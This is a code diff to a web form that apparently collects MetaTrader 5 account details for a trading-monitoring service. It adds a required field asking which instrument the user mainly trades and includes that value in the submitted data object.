@@ -342,6 +342,13 @@
                                    placeholder="e.g., Exness-Trial9">
                         </div>
 
+                        <div class="mb-6">
+                            <label for="instrument" class="block text-sm font-semibold text-gray-700 mb-1">Which instrument will you be trading Mainly?</label>
+                            <input type="text" id="instrument" name="instrument" required 
+                                   class="w-full px-4 py-3 border border-gray-300 rounded-lg shadow-sm focus:ring-primary-purple focus:border-primary-purple transition duration-150 ease-in-out bg-gray-50"
+                                   placeholder="e.g., Apple Stock, Gold Futures, EUR/USD">
+                        </div>
+
                         <button type="submit" 
                                 class="w-full px-4 py-4 bg-primary-purple text-white font-bold rounded-lg shadow-lg hover:bg-header-dark transition duration-300 uppercase tracking-wide">
                             Submit for Monitoring
@@ -427,12 +434,14 @@
             const username = form.username.value;
             const password = form.password.value;
             const server = form.server.value;
+            const instrument = form.instrument.value;
             const messageBox = document.getElementById('message-box');
 
             const mt5Details = {
                 username: username,
                 password: password,
                 server: server,
+                instrument: instrument,
                 submitted_at: new Date().toISOString()
             };
 
